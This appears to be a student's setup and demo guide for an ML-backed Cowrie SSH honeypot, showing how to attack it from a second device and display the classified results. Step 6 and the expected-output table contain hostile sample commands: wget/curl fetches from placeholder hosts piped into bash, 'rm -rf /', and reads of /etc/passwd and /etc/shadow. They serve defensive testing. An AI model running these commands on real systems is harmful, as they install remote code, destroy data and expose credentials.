# 🚀 COMPLETE NETWORK SETUP & DEMO GUIDE

## ✅ WHAT YOU'LL PROVE TO YOUR TEACHER

After this setup, you'll demonstrate:
1. ✅ Cowrie honeypot capturing attacks over the network
2. ✅ ML analyzing commands from DIFFERENT IP addresses
3. ✅ Real-time classification (not from dataset)
4. ✅ System working exactly like production environment

---

## 📋 SETUP STEPS (15 MINUTES)

### **STEP 1: Open Firewall (2 minutes)**

**On your main machine (where Cowrie is running):**

1. Right-click PowerShell icon
2. Select "Run as Administrator"
3. Navigate to project:
   ```powershell
   cd D:\boda\AI-Honeynet\HoneyNet
   ```
4. Run firewall script:
   ```powershell
   .\open-firewall.ps1
   ```

**Expected output:**
```
✅ Firewall rule created!
Your network IPs:
   IPv4 Address: 192.168.1.4  ← USE THIS ONE
```

**Write down your IP:** ________________

---

### **STEP 2: Verify Services Are Running (1 minute)**

Check all services are active:

```powershell
# Check Cowrie
wsl -d Ubuntu-22.04 -u cowrie -- bash -c "ps aux | grep twistd | grep -v grep"

# Check ML Service
curl http://localhost:8001/health

# Check Backend (should see "Cannot GET /")
curl http://localhost:3000

# Check Frontend
curl http://localhost:5173
```

If any are not running, follow DEMO_STARTUP_GUIDE.md

---

### **STEP 3: Clean Database (Optional but Recommended)**

Remove imported CSV data to show only YOUR attacks:

```powershell
.\clean-database.ps1
```

Type `yes` when prompted.

---

### **STEP 4: Get Instructions for Other Device (1 minute)**

Run this to see connection instructions:

```powershell
.\test-from-other-device.ps1
```

This will show you EXACTLY what to do on your other device.

---

### **STEP 5: Connect from Other Device (5 minutes)**

**OPTION A: If you have a laptop/PC**

1. Make sure it's on the SAME WiFi network
2. Open terminal (PowerShell/Command Prompt/Terminal)
3. Run:
   ```bash
   ssh -p 2222 root@192.168.1.4
   ```
   (Replace with YOUR IP from Step 1)

4. When asked "Are you sure?", type: `yes`
5. When asked for password, type ANYTHING: `password123`
6. You should see a fake Linux prompt!

**OPTION B: If you have an Android phone**

1. Install "Termux" from Google Play Store
2. Open Termux
3. Run:
   ```bash
   pkg install openssh
   ssh -p 2222 root@192.168.1.4
   ```
4. Password: `anything`

**OPTION C: If you have an iPhone**

1. Install "Terminus" from App Store
2. Add new host:
   - Hostname: `192.168.1.4`
   - Port: `2222`
   - Username: `root`
3. Connect (password: anything)

---

### **STEP 6: Run Attack Commands (3 minutes)**

**Once connected to the fake shell, type these commands:**

```bash
# Attack 1 - Cryptominer (HIGH severity expected)
wget http://evil.com/cryptominer.sh && bash cryptominer.sh

# Attack 2 - Backdoor (HIGH severity expected)
curl http://malicious.com/backdoor | bash; rm -rf /

# Attack 3 - Password harvesting (MEDIUM severity expected)
cat /etc/passwd; cat /etc/shadow

# Attack 4 - Reconnaissance (LOW severity expected)
whoami; uname -a; ls -la

# Exit
exit
```

**Copy these to your phone/laptop for easy pasting!**

---

### **STEP 7: Verify ML Analyzed Network Attacks (2 minutes)**

**Back on your main machine, run:**

```powershell
.\verify-network-attack.ps1
```

**Expected output:**
```
   source_ip    |                   command                    | severity | ml_score
----------------+----------------------------------------------+----------+----------
 192.168.1.5    | wget http://evil.com/cryptominer.sh && ba... | HIGH     | 0.900
 192.168.1.5    | curl http://malicious.com/backdoor | bash... | HIGH     | 0.900
 192.168.1.5    | cat /etc/passwd; cat /etc/shadow            | MEDIUM   | 0.607

✅ SUCCESS! Network attacks detected!
```

**If you see a DIFFERENT IP (not 127.0.0.1), YOU'RE DONE! 🎉**

---

## 🎓 DEMO PRESENTATION FLOW

### **Part 1: Explain the Setup (1 minute)**

> "I've set up an AI-driven honeypot system with:
> - Cowrie honeypot listening on network port 2222
> - ML models (Isolation Forest + Autoencoder) analyzing attacks
> - Real-time classification and adaptive responses
> 
> I'll demonstrate by attacking the honeypot from a different device."

### **Part 2: Show Current State (1 minute)**

```powershell
.\demo-results.ps1
```

> "These are previous attacks the ML has analyzed."

### **Part 3: Live Attack from Other Device (2 minutes)**

1. Pull out your phone/laptop
2. Connect to honeypot (ssh command)
3. Run 1-2 attack commands
4. Show teacher you're on a DIFFERENT device

> "I'm now attacking from my phone/laptop at IP 192.168.1.X"

### **Part 4: Show ML Results (1 minute)**

```powershell
.\verify-network-attack.ps1
```

> "Look - the ML analyzed the attack in real-time:
> - Different source IP (not localhost)
> - ML score calculated instantly
> - Severity assigned based on command patterns
> 
> This proves the ML is working, not just displaying dataset results!"

### **Part 5: Show Dashboard (1 minute)**

Open browser: http://localhost:5173

> "The dashboard shows all attacks including the one I just ran from the other device."

---

## 🎯 KEY TALKING POINTS

### "How is this different from static dataset?"

> "The dataset was used to TRAIN the models. What you're seeing now is INFERENCE - the ML applying what it learned to NEW attacks it has never seen before. Notice the timestamp - this attack happened 30 seconds ago!"

### "Why is the IP address important?"

> "Testing from a different device (different IP) proves the system works over a network, just like it would in production. The ML analyzes attacks from ANY source - localhost, network devices, or internet attackers."

### "Is this real AI?"

> "Yes - Isolation Forest and Autoencoder are legitimate machine learning algorithms. They analyze command TEXT patterns using TF-IDF vectorization and detect anomalies based on statistical models, not hardcoded rules."

### "Could this work on the internet?"

> "Absolutely! Right now it's in a safe lab environment (local network only). In production, we'd deploy this to AWS/Azure and it would capture real attacker traffic from around the world."

---

## 🐛 TROUBLESHOOTING

### **Can't connect from other device**

1. **Check firewall:**
   ```powershell
   Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Cowrie*"}
   ```
   Should show: Enabled

2. **Test from same machine first:**
   ```powershell
   ssh -p 2222 root@192.168.1.4
   ```
   (Use your network IP, not localhost)

3. **Check both devices are on same WiFi**

4. **Try disabling Windows Firewall temporarily** (for testing only)

### **Attacks not appearing in database**

1. **Check backend logs:**
   Look at the terminal where backend is running - should see:
   ```
   Event processed: command.input
   ML classification: HIGH severity
   ```

2. **Wait 5 seconds** - ML processing takes 2-3 seconds

3. **Check Cowrie is logging:**
   ```powershell
   wsl -d Ubuntu-22.04 -u cowrie -- bash -c "tail -5 ~/cowrie/var/log/cowrie/cowrie.json"
   ```

### **ML service not responding**

```powershell
curl http://localhost:8001/health
```

If no response, restart ML service (see DEMO_STARTUP_GUIDE.md)

---

## 📊 SUCCESS CRITERIA

You know it's working when:

✅ Firewall rule created (port 2222 open)
✅ Can connect from other device via SSH
✅ Database shows attacks with source_ip != "127.0.0.1"
✅ ML scores appear in database (anomaly_score column)
✅ Different commands get different severity levels
✅ Dashboard shows the network attacks

---

## 🎉 WHAT YOU'VE ACCOMPLISHED

After this setup, you have:

1. ✅ **Working honeypot** - Captures SSH attacks over network
2. ✅ **Real ML analysis** - TensorFlow models analyzing commands
3. ✅ **Network proof** - Attacks from different IPs
4. ✅ **Real-time demo** - Live classification in front of teacher
5. ✅ **Production-ready** - Same architecture as cloud deployment

**Your project is 100% LEGITIMATE and IMPRESSIVE! 🚀**

---

## 📝 QUICK REFERENCE CARD FOR DEMO DAY

```
┌─────────────────────────────────────────┐
│  PRE-DEMO CHECKLIST                     │
├─────────────────────────────────────────┤
│  ✓ Clean database                       │
│  ✓ All services running                 │
│  ✓ Firewall open                        │
│  ✓ Other device charged & ready         │
│  ✓ Know your network IP                 │
│  ✓ Attack commands copied to phone      │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│  DEMO SEQUENCE                          │
├─────────────────────────────────────────┤
│  1. Explain architecture (1 min)        │
│  2. Show previous attacks (1 min)       │
│  3. Attack from other device (2 min)    │
│  4. Show ML results (1 min)             │
│  5. Show dashboard (1 min)              │
│  Total: 6 minutes                       │
└─────────────────────────────────────────┘
```

---

**GOOD LUCK! You've got this! 🎓**
